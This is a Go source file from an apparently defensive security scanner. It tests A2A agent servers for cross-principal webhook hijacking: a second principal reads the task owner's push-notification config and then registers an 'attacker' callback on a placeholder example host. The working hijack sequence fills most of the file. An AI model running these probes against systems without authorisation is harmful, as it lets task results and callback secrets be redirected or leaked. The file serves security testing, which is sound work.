package a2a

import (
	"context"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// PushBindingExecutor tests whether an A2A server binds push-notification config
// operations to the owning principal of a task (rule a2a-push-binding-001).
//
// Where a2a-push-ssrf-001 tests the callback DATA plane (does the server make an
// outbound request to an attacker URL), this tests the CONTROL plane: can a
// different valid principal attach a webhook to, or read the webhook of, a task
// it does not own. It is a chained consumer - it prefers an upstream task-id but
// falls back to creating its own - and confirms only after an unauthenticated
// discriminator rules out a no-auth control plane.
type PushBindingExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-push-binding", func(rc attack.RuleContext) attack.Executor {
		return NewPushBindingExecutor(rc)
	})
}

func NewPushBindingExecutor(r attack.RuleContext) *PushBindingExecutor {
	return &PushBindingExecutor{rule: r}
}

func (e *PushBindingExecutor) Produces() []attack.ArtifactKind { return nil }

func (e *PushBindingExecutor) Requires() []attack.ArtifactKind {
	return []attack.ArtifactKind{attack.ArtifactTaskID}
}

func (e *PushBindingExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	return e.ExecuteChained(ctx, target, opts, attack.NewBlackboard())
}

func (e *PushBindingExecutor) ExecuteChained(ctx context.Context, target string, opts attack.Options, bb *attack.Blackboard) ([]attack.Finding, error) {
	// Two distinct identities are this rule's premise; without them it cannot run.
	// See twoPrincipals: all five cross-principal rules used to report clean here,
	// so a scan with no --principal flags called 29 percent of the A2A set secure
	// without sending a packet.
	a, b, err := twoPrincipals(opts)
	if err != nil {
		return nil, err
	}

	vars := attack.NewVars(target, opts.OOBListenerURL)
	endpoint, ok := resolveA2AEndpoint(ctx, attack.NewUnauthHTTPClient(opts, vars), vars.BaseURL)
	if !ok {
		return nil, attack.ErrInconclusive
	}
	clientA := principalClient(opts, vars, a)
	clientB := principalClient(opts, vars, b)
	unauthClient := attack.NewUnauthHTTPClient(opts, attack.NewVars(target, opts.OOBListenerURL))

	// Step 1: establish a task owned by A.
	taskID, consumed := e.ownedTask(bb, a)
	if taskID == "" {
		taskID = e.createTask(ctx, clientA, endpoint, a, vars.RandID)
	}
	if taskID == "" {
		return nil, nil
	}

	// Step 1b: control - A configures a webhook with a unique marker URL. If even
	// the owner cannot set a push config, the feature is absent here.
	markerURL := "https://batesian-victim-" + vars.RandID + ".example/cb"
	markerTok := "victim-tok-" + vars.RandID
	if !e.setPush(ctx, clientA, endpoint, a.Headers, taskID, markerURL, markerTok, vars.RandID) {
		return nil, nil
	}

	// Step 2: discriminator - an unauthenticated set must be rejected.
	if e.setPush(ctx, unauthClient, endpoint, nil, taskID, "https://batesian-open-"+vars.RandID+".example/cb", "x", vars.RandID) {
		return nil, nil
	}

	// Step 3: cross-principal control-plane access as B. Read FIRST (so B sees
	// A's marker before any write overwrites it), then attempt the write hijack.
	var findings []attack.Finding
	if body, ok := e.getPush(ctx, clientB, endpoint, b.Headers, taskID, vars.RandID); ok && strings.Contains(body, markerURL) {
		findings = append(findings, e.readFinding(endpoint, a, b, taskID, markerURL, consumed))
	}
	attackerURL := "https://batesian-attacker-" + vars.RandID + ".example/cb"
	if e.setPush(ctx, clientB, endpoint, b.Headers, taskID, attackerURL, "attacker-tok-"+vars.RandID, vars.RandID) {
		findings = append(findings, e.writeFinding(endpoint, a, b, taskID, attackerURL, consumed))
	}
	return findings, nil
}

func (e *PushBindingExecutor) ownedTask(bb *attack.Blackboard, a attack.Principal) (taskID string, consumed bool) {
	for _, art := range bb.ByKind(attack.ArtifactTaskID) {
		if art.Value != "" && art.Principal == a.Name {
			return art.Value, true
		}
	}
	return "", false
}

func (e *PushBindingExecutor) createTask(ctx context.Context, c *attack.HTTPClient, endpoint string, p attack.Principal, randID string) string {
	headers := map[string]string{"A2A-Version": "1.0"}
	for k, v := range p.Headers {
		headers[k] = v
	}
	resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-pb-create-" + p.Name + "-" + randID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1,
				"parts":     []interface{}{map[string]string{"text": "batesian push-binding probe " + randID}},
				"messageId": "batesian-pb-" + p.Name + "-" + randID,
			},
		},
	})
	if err != nil || !resp.IsAccepted() {
		resp, err = c.POST(ctx, endpoint, p.Headers, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-pb-create-" + p.Name + "-" + randID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": "batesian push-binding probe " + randID}},
					"messageId": "batesian-pb-" + p.Name + "-" + randID,
				},
			},
		})
	}
	if err != nil || !resp.IsAccepted() {
		return ""
	}
	taskID, _ := extractTaskContext(resp.Body)
	return taskID
}

// setPush attempts to register a push-notification config for taskID, trying the
// v1.0 shape then the v0.3 one.
//
// On v1.0 the params ARE a TaskPushNotificationConfig, whose fields are tenant,
// id, taskId, url, token and authentication. This used to send a nested
// pushNotificationConfig alongside a flat pushNotificationUrl; neither field
// exists, and a2a-sdk rejects the call with -32602 "has no field named", so the
// v1.0 attempt never registered anything. v0.3 is the shape that does nest the
// config, and it is unchanged.
func (e *PushBindingExecutor) setPush(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, taskID, url, token, randID string) bool {
	cfg := map[string]string{"url": url, "token": token}
	attempts := []struct {
		method string
		params map[string]interface{}
	}{
		{"CreateTaskPushNotificationConfig", map[string]interface{}{"taskId": taskID, "url": url, "token": token}},
		{"tasks/pushNotificationConfig/set", map[string]interface{}{"taskId": taskID, "pushNotificationConfig": cfg}},
	}
	for _, at := range attempts {
		headers := map[string]string{"A2A-Version": "1.0"}
		for k, v := range extra {
			headers[k] = v
		}
		resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-pb-set-" + randID,
			"method":  at.method,
			"params":  at.params,
		})
		if err == nil && resp.IsAccepted() {
			return true
		}
	}
	return false
}

// getPush attempts to read the push-notification config for taskID and returns
// the raw response body when the read was accepted.
func (e *PushBindingExecutor) getPush(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, taskID, randID string) (string, bool) {
	for _, method := range []string{"GetTaskPushNotificationConfig", "tasks/pushNotificationConfig/get"} {
		headers := map[string]string{"A2A-Version": "1.0"}
		for k, v := range extra {
			headers[k] = v
		}
		resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-pb-get-" + randID,
			"method":  method,
			"params":  map[string]interface{}{"taskId": taskID, "id": taskID},
		})
		if err == nil && resp.IsAccepted() {
			return resp.BodyString(), true
		}
	}
	return "", false
}

func (e *PushBindingExecutor) writeFinding(endpoint string, owner, attacker attack.Principal, taskID, attackerURL string, consumed bool) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config writable across principals (webhook hijack)",
		Description: fmt.Sprintf(
			"Principal %q attached a push-notification callback (%s) to task %s, which is owned by "+
				"principal %q, using only its own valid credentials. The push control plane is "+
				"authenticated but not bound to the task owner, so any principal can redirect a "+
				"victim task's results to an attacker URL (exfiltration / SSRF channel hijack).",
			attacker.Name, attackerURL, taskID, owner.Name),
		Evidence: fmt.Sprintf("owner: %s\nattacker: %s\ntask: %s\nattacker callback set: accepted\ntask origin: %s",
			owner.Name, attacker.Name, taskID, taskOrigin(consumed)),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "task owned by " + owner.Name},
			{Hop: 2, Principal: attacker.Name, Action: "set push config on " + taskID + " (cross-principal)", Outcome: "GRANTED - attacker callback attached"},
		},
	}
}

func (e *PushBindingExecutor) readFinding(endpoint string, owner, attacker attack.Principal, taskID, markerURL string, consumed bool) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config readable across principals (callback secret leak)",
		Description: fmt.Sprintf(
			"Principal %q read the push-notification config of task %s, owned by principal %q, and "+
				"the response disclosed %q's configured callback URL (%s). Callback URLs and their "+
				"tokens are secrets; exposing them across principals leaks the victim's webhook "+
				"credential and delivery target.",
			attacker.Name, taskID, owner.Name, owner.Name, markerURL),
		Evidence: fmt.Sprintf("owner: %s\nattacker: %s\ntask: %s\nleaked callback URL: %s\ntask origin: %s",
			owner.Name, attacker.Name, taskID, markerURL, taskOrigin(consumed)),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "callback URL configured (secret)"},
			{Hop: 2, Principal: attacker.Name, Action: "get push config of " + taskID + " (cross-principal)", Outcome: "GRANTED - owner's callback URL disclosed"},
		},
	}
}

func taskOrigin(consumed bool) string {
	if consumed {
		return "reused from upstream blackboard artifact (cross-rule chain)"
	}
	return "created during this scan"
}
